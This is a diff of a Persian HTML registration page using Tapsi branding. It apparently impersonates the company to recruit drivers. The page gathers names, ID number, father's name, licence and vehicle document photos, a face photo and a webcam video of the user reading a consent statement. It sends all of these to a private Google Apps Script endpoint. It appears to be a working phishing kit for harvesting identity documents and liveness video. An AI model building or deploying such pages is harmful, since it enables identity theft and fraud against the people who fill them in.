@@ -2,145 +2,765 @@
 <html dir="rtl" lang="fa">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ثبت نام رانندگان تپسی</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>ثبت نام سفیران تپسی</title>
+  
+  <!-- فونت وزیر متن رسمی -->
+  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" type="text/css" />
+
   <style>
-    body { font-family: Tahoma, sans-serif; text-align: center; background: #f4f4f9; padding: 15px; margin: 0; }
-    .container { max-width: 450px; margin: 0 auto; background: #fff; padding: 20px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-    .video-box { position: relative; width: 100%; background: #000; border-radius: 12px; overflow: hidden; min-height: 250px; }
+    :root {
+      --primary-color: #0065DC;
+      --bg-color: #ffffff;
+      --input-bg: #f2f3f5;
+      --text-main: #121212;
+      --text-sub: #666666;
+      --error-color: #e53935;
+      --border-radius: 12px;
+    }
+
+    * { box-sizing: border-box; font-family: 'Vazirmatn', sans-serif; -webkit-tap-highlight-color: transparent; }
+    
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: var(--bg-color);
+      color: var(--text-main);
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    /* محتوای اصلی فرم (قابلیت اسکرول) */
+    .form-container {
+      flex: 1;
+      padding: 24px 20px 100px 20px; /* پدینگ پایین برای نرسیدن متن به دکمه چسبیده */
+      max-width: 480px;
+      margin: 0 auto;
+      width: 100%;
+    }
+
+    .step-content { display: none; }
+    .step-content.active { display: block; animation: fadeIn 0.3s ease-in-out; }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(8px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* عناوین */
+    h2.step-title {
+      font-size: 22px;
+      font-weight: 800;
+      margin: 0 0 8px 0;
+      color: #000;
+    }
+
+    p.step-subtitle {
+      font-size: 14px;
+      color: var(--text-sub);
+      margin: 0 0 24px 0;
+      line-height: 1.5;
+    }
+
+    /* استایل ورودی‌ها */
+    .form-group {
+      margin-bottom: 20px;
+      text-align: right;
+    }
+
+    label {
+      display: block;
+      font-weight: 700;
+      font-size: 14px;
+      margin-bottom: 8px;
+    }
+
+    input[type="text"], input[type="tel"], select {
+      width: 100%;
+      padding: 14px 16px;
+      background-color: var(--input-bg);
+      border: 1px solid transparent;
+      border-radius: var(--border-radius);
+      font-size: 15px;
+      outline: none;
+      transition: all 0.2s;
+    }
+
+    input[type="text"]:focus, select:focus {
+      border-color: var(--primary-color);
+      background-color: #fff;
+    }
+
+    input.error {
+      border: 1px solid var(--error-color) !important;
+    }
+
+    .error-text {
+      color: var(--error-color);
+      font-size: 12px;
+      margin-top: 6px;
+      display: none;
+    }
+
+    /* دکمه‌های رادیویی (جنسیت و مدارک) */
+    .radio-group {
+      display: flex;
+      gap: 20px;
+      align-items: center;
+      margin-top: 8px;
+    }
+
+    .radio-option {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      cursor: pointer;
+      font-size: 15px;
+      font-weight: 600;
+    }
+
+    .radio-option input[type="radio"] {
+      width: 20px;
+      height: 20px;
+      accent-color: var(--primary-color);
+      cursor: pointer;
+    }
+
+    /* کارت‌های آپلود عکس */
+    .upload-card {
+      background-color: #f8f9fa;
+      border: 1px dashed #d1d5db;
+      border-radius: 16px;
+      padding: 24px 16px;
+      text-align: center;
+      margin-bottom: 16px;
+      position: relative;
+      min-height: 140px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .upload-card img.preview {
+      max-width: 100%;
+      max-height: 120px;
+      border-radius: 8px;
+      object-fit: cover;
+    }
+
+    .btn-upload-trigger {
+      background-color: var(--primary-color);
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 20px;
+      font-size: 13px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .delete-btn {
+      position: absolute;
+      bottom: 12px;
+      right: 12px;
+      background: #ffffff;
+      border: 1px solid #eee;
+      border-radius: 50%;
+      width: 36px;
+      height: 36px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+    }
+
+    /* ویدیوی احراز هویت */
+    .video-box {
+      position: relative;
+      width: 100%;
+      background: #000;
+      border-radius: 16px;
+      overflow: hidden;
+      min-height: 220px;
+      margin-bottom: 15px;
+    }
+
     video { width: 100%; display: block; }
-    .teleprompter { position: absolute; bottom: 10px; left: 10px; right: 10px; background: rgba(0,0,0,0.8); color: #fff; padding: 12px; border-radius: 8px; font-size: 13px; line-height: 1.6; }
-    .btn { padding: 12px 24px; margin: 15px 5px; font-size: 15px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; width: 80%; }
-    .btn-start { background: #ff5722; color: #fff; }
-    .btn-stop { background: #757575; color: #fff; }
-    .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-    #status { margin-top: 15px; font-weight: bold; color: #333; line-height: 1.5; }
+
+    .teleprompter {
+      position: absolute;
+      bottom: 10px;
+      left: 10px;
+      right: 10px;
+      background: rgba(0,0,0,0.85);
+      color: #fff;
+      padding: 10px;
+      border-radius: 8px;
+      font-size: 12px;
+      line-height: 1.6;
+      text-align: center;
+    }
+
+    /* بخش چسبیده پایین (Sticky Bottom Nav) */
+    .bottom-nav {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background-color: #ffffff;
+      box-shadow: 0 -4px 16px rgba(0,0,0,0.06);
+      z-index: 100;
+    }
+
+    .progress-bar-container {
+      width: 100%;
+      height: 4px;
+      background-color: #e5e7eb;
+    }
+
+    .progress-bar {
+      height: 100%;
+      background-color: var(--primary-color);
+      width: 16.66%;
+      transition: width 0.3s ease;
+    }
+
+    .nav-actions {
+      max-width: 480px;
+      margin: 0 auto;
+      padding: 12px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .btn-next {
+      background-color: var(--primary-color);
+      color: white;
+      border: none;
+      padding: 12px 28px;
+      border-radius: 25px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      transition: all 0.2s;
+    }
+
+    .btn-next:disabled {
+      background-color: #e5e7eb;
+      color: #9ca3af;
+      cursor: not-allowed;
+    }
+
+    .btn-back {
+      background: none;
+      border: none;
+      color: #4b5563;
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    /* مدال / پاپ‌آپ‌ها */
+    .modal-overlay {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0, 0, 0, 0.5);
+      display: none;
+      justify-content: center;
+      align-items: flex-end;
+      z-index: 1000;
+    }
+
+    .modal-overlay.active { display: flex; }
+
+    .modal-card {
+      background: #fff;
+      width: 100%;
+      max-width: 480px;
+      border-radius: 20px 20px 0 0;
+      padding: 24px;
+      animation: slideUp 0.3s ease-out;
+    }
+
+    @keyframes slideUp {
+      from { transform: translateY(100%); }
+      to { transform: translateY(0); }
+    }
+
+    .modal-title { font-size: 18px; font-weight: 800; margin-bottom: 12px; }
+    .modal-list { text-align: right; font-size: 14px; line-height: 1.8; color: #374151; padding-right: 20px; }
+    .modal-btn { background: var(--primary-color); color: #fff; border: none; width: 100%; padding: 12px; border-radius: 12px; font-weight: 700; margin-top: 16px; cursor: pointer; }
   </style>
 </head>
 <body>
 
-  <div class="container">
-    <h2>ثبت نام رانندگان تپسی</h2>
-    <h3>احراز هویت تصویری</h3>
-    <p>روی دکمه زیر کلیک کنید، اجازه دسترسی به دوربین را بدهید و متن پایین کادر را بخوانید.</p>
+  <!-- فرم اسکرول شونده -->
+  <div class="form-container">
+    
+    <!-- گام ۱: اطلاعات شناسایی سفیر -->
+    <div class="step-content active" id="step-1">
+      <h2 class="step-title">اطلاعات شناسایی سفیر</h2>
+      <p class="step-subtitle">مشخصات فردی خود را وارد کنید.</p>
 
-    <div class="video-box">
-      <video id="video" autoplay muted playsinline></video>
-      <div class="teleprompter">
-        "اینجانب درخواست ثبت نام به عنوان راننده را دارم و صحت تمامی اطلاعات وارد شده را تایید می‌کنم."
+      <div class="form-group">
+        <label>نام</label>
+        <input type="text" id="firstName" placeholder="نام" oninput="validateStep1()">
+      </div>
+
+      <div class="form-group">
+        <label>نام خانوادگی</label>
+        <input type="text" id="lastName" placeholder="نام خانوادگی" oninput="validateStep1()">
+        <div class="error-text" id="lastNameError">لطفا نام خانوادگی خود را با حروف فارسی وارد نمایید.</div>
+      </div>
+
+      <div class="form-group">
+        <label>شماره شناسنامه</label>
+        <input type="tel" id="nationalId" placeholder="شماره شناسنامه" oninput="validateStep1()">
+      </div>
+
+      <div class="form-group">
+        <label>نام پدر</label>
+        <input type="text" id="fatherName" placeholder="نام پدر" oninput="validateStep1()">
+      </div>
+
+      <div class="form-group">
+        <label>جنسیت</label>
+        <div class="radio-group">
+          <label class="radio-option">
+            <input type="radio" name="gender" value="مرد" checked> مرد
+          </label>
+          <label class="radio-option">
+            <input type="radio" name="gender" value="زن"> زن
+          </label>
+        </div>
       </div>
     </div>
 
-    <button id="startBtn" class="btn btn-start" onclick="startCamera()">🎥 شروع ضبط</button>
-    <button id="stopBtn" class="btn btn-stop" onclick="stopRecording()" disabled>⏹ پایان و ارسال</button>
-    
-    <p id="status"></p>
+    <!-- گام ۲: اطلاعات محل فعالیت -->
+    <div class="step-content" id="step-2">
+      <h2 class="step-title">اطلاعات محل فعالیت</h2>
+      <p class="step-subtitle">شهر محل فعالیت را انتخاب کنید.</p>
+
+      <div class="form-group">
+        <label>شهر محل فعالیت</label>
+        <input type="text" id="city" value="تهران" oninput="validateStep2()">
+      </div>
+
+      <div class="form-group">
+        <label>منطقه محل فعالیت</label>
+        <input type="text" id="zone" placeholder="مثلا: منطقه ۳" oninput="validateStep2()">
+      </div>
+    </div>
+
+    <!-- گام ۳: نوع کاربری -->
+    <div class="step-content" id="step-3">
+      <h2 class="step-title">نوع کاربری</h2>
+      <p class="step-subtitle">نوع کاربری خود را انتخاب کنید.</p>
+
+      <div class="radio-group" style="flex-direction: column; align-items: flex-start; gap: 16px;">
+        <label class="radio-option">
+          <input type="radio" name="usageType" value="passenger" onchange="handleUsageChange(this)">
+          کاربری بسته + مسافر
+        </label>
+        <label class="radio-option">
+          <input type="radio" name="usageType" value="package" checked onchange="handleUsageChange(this)">
+          کاربری بسته
+        </label>
+      </div>
+    </div>
+
+    <!-- گام ۴: آپلود گواهی‌نامه -->
+    <div class="step-content" id="step-4">
+      <h2 class="step-title">آپلود گواهی‌نامه</h2>
+      <p class="step-subtitle">گواهی‌نامه معتبر خود را بارگذاری کنید. دقت داشته باشید که تصویر واضح و بدون اسکن باشد.</p>
+
+      <div class="form-group">
+        <label class="radio-option">
+          <input type="radio" checked> گواهی‌نامه
+        </label>
+      </div>
+
+      <!-- کارت روی گواهی‌نامه -->
+      <div class="upload-card" id="card-license-front">
+        <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="1.5"><rect x="3" y="4" width="18" height="16" rx="2"/><circle cx="9" cy="10" r="2"/><path d="M15 8h2m-2 4h2M7 16h10"/></svg>
+        <button class="btn-upload-trigger" onclick="openPicker('license-front')">تصویر روی گواهی‌نامه</button>
+      </div>
+
+      <!-- کارت پشت گواهی‌نامه -->
+      <div class="upload-card" id="card-license-back">
+        <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="1.5"><rect x="3" y="4" width="18" height="16" rx="2"/><circle cx="9" cy="10" r="2"/><path d="M15 8h2m-2 4h2M7 16h10"/></svg>
+        <button class="btn-upload-trigger" onclick="openPicker('license-back')">تصویر پشت گواهی‌نامه</button>
+      </div>
+    </div>
+
+    <!-- گام ۵: آپلود مدرک موتور -->
+    <div class="step-content" id="step-5">
+      <h2 class="step-title">آپلود مدرک موتور</h2>
+      <p class="step-subtitle">یکی از مدارک زیر را انتخاب و بارگذاری نمایید. دقت داشته باشید تصویر باید واضح و بدون اسکن باشد.</p>
+
+      <div class="radio-group" style="margin-bottom: 20px;">
+        <label class="radio-option">
+          <input type="radio" name="motorDocType" value="card" checked onchange="toggleMotorDocType()"> کارت موتور
+        </label>
+        <label class="radio-option">
+          <input type="radio" name="motorDocType" value="paper" onchange="toggleMotorDocType()"> برگه سبز یا قولنامه
+        </label>
+      </div>
+
+      <!-- کارت‌های آپلود دینامیک -->
+      <div class="upload-card" id="card-motor-front">
+        <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="1.5"><rect x="3" y="4" width="18" height="16" rx="2"/><circle cx="9" cy="10" r="2"/><path d="M15 8h2m-2 4h2M7 16h10"/></svg>
+        <button class="btn-upload-trigger" id="btn-motor-front" onclick="openPicker('motor-front')">تصویر روی کارت موتور</button>
+      </div>
+
+      <div class="upload-card" id="card-motor-back">
+        <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="1.5"><rect x="3" y="4" width="18" height="16" rx="2"/><circle cx="9" cy="10" r="2"/><path d="M15 8h2m-2 4h2M7 16h10"/></svg>
+        <button class="btn-upload-trigger" id="btn-motor-back" onclick="openPicker('motor-back')">تصویر پشت کارت موتور</button>
+      </div>
+    </div>
+
+    <!-- گام ۶: عکس پروفایل و احراز هویت ویدئویی -->
+    <div class="step-content" id="step-6">
+      <h2 class="step-title">احراز هویت و تصویر سفیر</h2>
+      <p class="step-subtitle">عکس چهره خود را آپلود کرده و ویدیوی احراز هویت را ضبط کنید.</p>
+
+      <div class="upload-card" id="card-profile">
+        <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="1.5"><circle cx="12" cy="8" r="4"/><path d="M6 21v-2a4 4 0 0 1 4-4h4a4 4 0 0 1 4 4v2"/></svg>
+        <button class="btn-upload-trigger" onclick="openPicker('profile')">تصویر چهره سفیر</button>
+      </div>
+
+      <div class="video-box">
+        <video id="video" autoplay muted playsinline></video>
+        <div class="teleprompter">
+          "اینجانب درخواست ثبت نام به عنوان راننده را دارم و صحت تمامی اطلاعات وارد شده را تایید می‌کنم."
+        </div>
+      </div>
+
+      <div style="text-align: center;">
+        <button id="startVideoBtn" class="btn-upload-trigger" style="background:#ff5722;" onclick="startCamera()">🎥 شروع ضبط ویدیو</button>
+        <button id="stopVideoBtn" class="btn-upload-trigger" style="background:#757575;" onclick="stopRecording()" disabled>⏹ پایان ضبط</button>
+      </div>
+      <p id="videoStatus" style="font-size:13px; font-weight:bold; margin-top:10px; text-align:center;"></p>
+    </div>
+
   </div>
 
-  <script>
-    // آدرس Web App گوگل اسکریپت خود را بین دو کوتیشن پایین بگذارید
-    const WEB_APP_URL = "https://script.google.com/macros/s/AKfycby9NnKEghUufLyn1q8bpsZp0CfS33fVOZCKbny6LRqNlx715mETs__Pg2ZfOEEUJulY/exec"; 
+  <!-- نوار کنترل چسبیده به پایین (Fixed Bottom Nav) -->
+  <div class="bottom-nav">
+    <div class="progress-bar-container">
+      <div class="progress-bar" id="progressBar"></div>
+    </div>
+    <div class="nav-actions">
+      <button class="btn-back" id="backBtn" onclick="prevStep()" style="visibility: hidden;">
+        ‹ بازگشت
+      </button>
+      <button class="btn-next" id="nextBtn" onclick="nextStep()" disabled>
+        مرحله بعد ←
+      </button>
+    </div>
+  </div>
 
-    let mediaRecorder, stream, recordedChunks = [];
+  <!-- پاپ‌آپ هشدار مسافر (Modal) -->
+  <div class="modal-overlay" id="passengerModal">
+    <div class="modal-card">
+      <div class="modal-title">توجه کنید</div>
+      <p style="font-size: 14px; font-weight: 700; margin-bottom: 8px;">سفیر گرامی جهت جابجایی مسافر باید موارد زیر را داشته باشید:</p>
+      <ul class="modal-list">
+        <li>گواهی‌نامه معتبر داشته باشید (تاریخ انقضا تمام نشده باشد)</li>
+        <li>بیمه نامه معتبر داشته باشید</li>
+      </ul>
+      <button class="modal-btn" onclick="closeModal('passengerModal')">متوجه شدم</button>
+    </div>
+  </div>
+
+  <!-- پاپ‌آپ انتخاب منبع عکس (دوربین / گالری) -->
+  <div class="modal-overlay" id="pickerModal">
+    <div class="modal-card">
+      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
+        <span style="font-weight:800; font-size:16px;">بارگذاری تصویر</span>
+        <span style="cursor:pointer; font-weight:bold; font-size:18px;" onclick="closeModal('pickerModal')">✕</span>
+      </div>
+      <button class="modal-btn" style="background:#f2f3f5; color:#000; text-align:right; display:flex; align-items:center; gap:10px;" onclick="triggerFileInput('camera')">
+        📷 گرفتن عکس با دوربین
+      </button>
+      <button class="modal-btn" style="background:#f2f3f5; color:#000; text-align:right; display:flex; align-items:center; gap:10px;" onclick="triggerFileInput('gallery')">
+        🖼 انتخاب از گالری
+      </button>
+    </div>
+  </div>
+
+  <!-- اینپوت‌های مخفی فایل -->
+  <input type="file" id="cameraInput" accept="image/*" capture="environment" style="display:none;" onchange="handleFileSelect(this)">
+  <input type="file" id="galleryInput" accept="image/*" style="display:none;" onchange="handleFileSelect(this)">
+
+  <script>
+    const WEB_APP_URL = "https://script.google.com/macros/s/AKfycby9NnKEghUufLyn1q8bpsZp0CfS33fVOZCKbny6LRqNlx715mETs__Pg2ZfOEEUJulY/exec";
+
+    let currentStep = 1;
+    const totalSteps = 6;
+    let activeUploadKey = '';
+
+    // ذخیره‌سازی تصاویر به صورت Base64
+    const uploadedImages = {
+      'license-front': null,
+      'license-back': null,
+      'motor-front': null,
+      'motor-back': null,
+      'profile': null
+    };
+
+    // ۱. مدیریت پیشرفت مراحل
+    function updateStepUI() {
+      document.querySelectorAll('.step-content').forEach(el => el.classList.remove('active'));
+      document.getElementById(`step-${currentStep}`).classList.add('active');
+
+      // به‌روزرسانی نوار پیشرفت
+      const progressPercent = (currentStep / totalSteps) * 100;
+      document.getElementById('progressBar').style.width = `${progressPercent}%`;
+
+      // نمایش/مخفی‌سازی دکمه بازگشت
+      document.getElementById('backBtn').style.visibility = currentStep === 1 ? 'hidden' : 'visible';
+
+      // تغییر متن دکمه در مرحله آخر
+      const nextBtn = document.getElementById('nextBtn');
+      if (currentStep === totalSteps) {
+        nextBtn.innerHTML = 'ثبت نهایی و ارسال ✓';
+      } else {
+        nextBtn.innerHTML = 'مرحله بعد ←';
+      }
+
+      validateCurrentStep();
+      window.scrollTo(0, 0);
+    }
+
+    function nextStep() {
+      if (currentStep < totalSteps) {
+        currentStep++;
+        updateStepUI();
+      } else {
+        submitFullForm();
+      }
+    }
+
+    function prevStep() {
+      if (currentStep > 1) {
+        currentStep--;
+        updateStepUI();
+      }
+    }
+
+    // ۲. اعتبارسنجی ورودی‌ها
+    function validateStep1() {
+      const fName = document.getElementById('firstName').value.trim();
+      const lName = document.getElementById('lastName').value.trim();
+      const nId = document.getElementById('nationalId').value.trim();
+      const father = document.getElementById('fatherName').value.trim();
+
+      const persianRegex = /^[\u0600-\u06FF\s]+$/;
+      const lNameInput = document.getElementById('lastName');
+      const lNameError = document.getElementById('lastNameError');
+
+      let isValid = true;
+
+      if (lName && !persianRegex.test(lName)) {
+        lNameInput.classList.add('error');
+        lNameError.style.display = 'block';
+        isValid = false;
+      } else {
+        lNameInput.classList.remove('error');
+        lNameError.style.display = 'none';
+      }
+
+      const isComplete = fName && lName && nId && father && isValid;
+      document.getElementById('nextBtn').disabled = !isComplete;
+    }
+
+    function validateStep2() {
+      const city = document.getElementById('city').value.trim();
+      const zone = document.getElementById('zone').value.trim();
+      document.getElementById('nextBtn').disabled = !(city && zone);
+    }
+
+    function validateCurrentStep() {
+      if (currentStep === 1) validateStep1();
+      else if (currentStep === 2) validateStep2();
+      else if (currentStep === 3) document.getElementById('nextBtn').disabled = false;
+      else if (currentStep === 4) {
+        document.getElementById('nextBtn').disabled = !(uploadedImages['license-front'] && uploadedImages['license-back']);
+      } else if (currentStep === 5) {
+        document.getElementById('nextBtn').disabled = !(uploadedImages['motor-front'] && uploadedImages['motor-back']);
+      } else if (currentStep === 6) {
+        document.getElementById('nextBtn').disabled = !(uploadedImages['profile'] && videoBlob);
+      }
+    }
+
+    // ۳. تغییر پاپ‌آپ‌ها
+    function handleUsageChange(radio) {
+      if (radio.value === 'passenger') {
+        document.getElementById('passengerModal').classList.add('active');
+      }
+    }
+
+    function closeModal(modalId) {
+      document.getElementById(modalId).classList.remove('active');
+    }
+
+    function toggleMotorDocType() {
+      const isPaper = document.querySelector('input[name="motorDocType"]:checked').value === 'paper';
+      document.getElementById('btn-motor-front').innerText = isPaper ? 'تصویر روی برگه سبز' : 'تصویر روی کارت موتور';
+      document.getElementById('btn-motor-back').innerText = isPaper ? 'تصویر پشت برگه سبز' : 'تصویر پشت کارت موتور';
+    }
+
+    // ۴. مدیریت آپلود عکس‌ها
+    function openPicker(key) {
+      activeUploadKey = key;
+      document.getElementById('pickerModal').classList.add('active');
+    }
+
+    function triggerFileInput(type) {
+      closeModal('pickerModal');
+      if (type === 'camera') document.getElementById('cameraInput').click();
+      else document.getElementById('galleryInput').click();
+    }
+
+    function handleFileSelect(input) {
+      if (input.files && input.files[0]) {
+        const file = input.files[0];
+        const reader = new FileReader();
+
+        reader.onload = function(e) {
+          const base64Str = e.target.result;
+          uploadedImages[activeUploadKey] = base64Str;
+          renderImagePreview(activeUploadKey, base64Str);
+          validateCurrentStep();
+        };
+
+        reader.readAsDataURL(file);
+      }
+    }
+
+    function renderImagePreview(key, src) {
+      const card = document.getElementById(`card-${key}`);
+      card.innerHTML = `
+        <img src="${src}" class="preview">
+        <button class="delete-btn" onclick="removeImage('${key}')">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#e53935" stroke-width="2"><path d="M3 6h18m-2 0v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
+        </button>
+      `;
+    }
+
+    function removeImage(key) {
+      uploadedImages[key] = null;
+      let btnText = 'انتخاب تصویر';
+      if (key === 'license-front') btnText = 'تصویر روی گواهی‌نامه';
+      if (key === 'license-back') btnText = 'تصویر پشت گواهی‌نامه';
+      if (key === 'motor-front') btnText = document.querySelector('input[name="motorDocType"]:checked').value === 'paper' ? 'تصویر روی برگه سبز' : 'تصویر روی کارت موتور';
+      if (key === 'motor-back') btnText = document.querySelector('input[name="motorDocType"]:checked').value === 'paper' ? 'تصویر پشت برگه سبز' : 'تصویر پشت کارت موتور';
+      if (key === 'profile') btnText = 'تصویر چهره سفیر';
+
+      const card = document.getElementById(`card-${key}`);
+      card.innerHTML = `
+        <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="1.5"><rect x="3" y="4" width="18" height="16" rx="2"/><circle cx="9" cy="10" r="2"/><path d="M15 8h2m-2 4h2M7 16h10"/></svg>
+        <button class="btn-upload-trigger" id="btn-${key}" onclick="openPicker('${key}')">${btnText}</button>
+      `;
+      validateCurrentStep();
+    }
+
+    // ۵. سیستم ضبط ویدیوی احراز هویت
+    let mediaRecorder, stream, recordedChunks = [], videoBlob = null;
 
     async function startCamera() {
-      const status = document.getElementById('status');
+      const status = document.getElementById('videoStatus');
       try {
-        status.innerText = "در حال درخواست دسترسی به دوربین...";
-        
-        stream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: "user" }, 
-          audio: true 
-        });
-        
+        status.innerText = "در حال دسترسی به دوربین...";
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
         document.getElementById('video').srcObject = stream;
 
         let options = { mimeType: 'video/webm' };
-        if (MediaRecorder.isTypeSupported('video/mp4')) {
-          options = { mimeType: 'video/mp4' };
-        } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
-          options = { mimeType: 'video/webm;codecs=vp8' };
-        }
+        if (MediaRecorder.isTypeSupported('video/mp4')) options = { mimeType: 'video/mp4' };
 
         recordedChunks = [];
         mediaRecorder = new MediaRecorder(stream, options);
-
-        mediaRecorder.ondataavailable = e => {
-          if (e.data && e.data.size > 0) {
-            recordedChunks.push(e.data);
-          }
+        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
+        mediaRecorder.onstop = () => {
+          if (stream) stream.getTracks().forEach(track => track.stop());
+          const mimeType = mediaRecorder.mimeType || 'video/webm';
+          videoBlob = new Blob(recordedChunks, { type: mimeType });
+          status.innerText = "✅ ویدیو با موفقیت ضبط شد.";
+          validateCurrentStep();
         };
 
-        mediaRecorder.onstop = uploadVideo;
-
-        // دریافت دیتای ویدیو هر ۱ ثانیه یک‌بار
         mediaRecorder.start(1000);
-
-        document.getElementById('startBtn').disabled = true;
-        document.getElementById('stopBtn').disabled = false;
-        status.innerText = "🔴 در حال ضبط... متن را بخوانید و سپس دکمه پایان را بزنید.";
+        document.getElementById('startVideoBtn').disabled = true;
+        document.getElementById('stopVideoBtn').disabled = false;
+        status.innerText = "🔴 در حال ضبط... متن را بخوانید.";
       } catch (err) {
-        console.error(err);
         alert("خطا در دسترسی به دوربین: " + err.message);
-        status.innerText = "دسترسی به دوربین داده نشد.";
       }
     }
 
     function stopRecording() {
       if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-        document.getElementById('status').innerText = "در حال پردازش ویدیو...";
-        mediaRecorder.stop(); // این کار رویداد onstop را اجرا می‌کند
-        document.getElementById('startBtn').disabled = false;
-        document.getElementById('stopBtn').disabled = true;
+        mediaRecorder.stop();
+        document.getElementById('startVideoBtn').disabled = false;
+        document.getElementById('stopVideoBtn').disabled = true;
       }
     }
 
-    function uploadVideo() {
-      // خاموش کردن دوربین پس از اتمام ضبط
-      if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-      }
-
-      const mimeType = mediaRecorder.mimeType || 'video/webm';
-      const blob = new Blob(recordedChunks, { type: mimeType });
-
-      if (blob.size === 0) {
-        document.getElementById('status').innerText = "❌ خطا: هیچ ویدیویی ضبط نشد! دوباره امتحان کنید.";
-        return;
-      }
-
-      const sizeMB = (blob.size / (1024 * 1024)).toFixed(2);
-      document.getElementById('status').innerText = `⏳ حجم ویدیو: ${sizeMB} مگابایت. در حال ارسال به سرور...`;
+    // ۶. ارسال فرم نهایی به Google Apps Script
+    function submitFullForm() {
+      const nextBtn = document.getElementById('nextBtn');
+      nextBtn.disabled = true;
+      nextBtn.innerText = "در حال ارسال اطلاعات...";
 
       const reader = new FileReader();
       reader.onloadend = function() {
-        const base64Data = reader.result;
-        
+        const videoBase64 = reader.result;
+
+        const payload = {
+          firstName: document.getElementById('firstName').value,
+          lastName: document.getElementById('lastName').value,
+          nationalId: document.getElementById('nationalId').value,
+          fatherName: document.getElementById('fatherName').value,
+          gender: document.querySelector('input[name="gender"]:checked').value,
+          city: document.getElementById('city').value,
+          zone: document.getElementById('zone').value,
+          usageType: document.querySelector('input[name="usageType"]:checked').value,
+          images: uploadedImages,
+          video: videoBase64,
+          mimeType: videoBlob.type
+        };
+
         fetch(WEB_APP_URL, {
           method: 'POST',
-          headers: {
-            'Content-Type': 'text/plain;charset=utf-8'
-          },
-          body: JSON.stringify({
-            video: base64Data,
-            mimeType: mimeType
-          })
+          headers: { 'Content-Type': 'text/plain;charset=utf-8' },
+          body: JSON.stringify(payload)
         })
         .then(res => res.json())
         .then(data => {
-          if (data.status === "success") {
-            document.getElementById('status').innerText = data.message;
-          } else {
-            document.getElementById('status').innerText = "خطا: " + data.message;
-          }
+          alert("ثبت نام شما با موفقیت تکمیل گردید!");
+          location.reload();
         })
         .catch(err => {
           console.error(err);
-          document.getElementById('status').innerText = "خطا در ارسال ویدیو به سرور!";
+          alert("خطا در ثبت اطلاعات. دوباره تلاش کنید.");
+          nextBtn.disabled = false;
+          nextBtn.innerText = "ثبت نهایی و ارسال ✓";
         });
       };
 
-      reader.readAsDataURL(blob);
+      reader.readAsDataURL(videoBlob);
     }
   </script>
 </body>
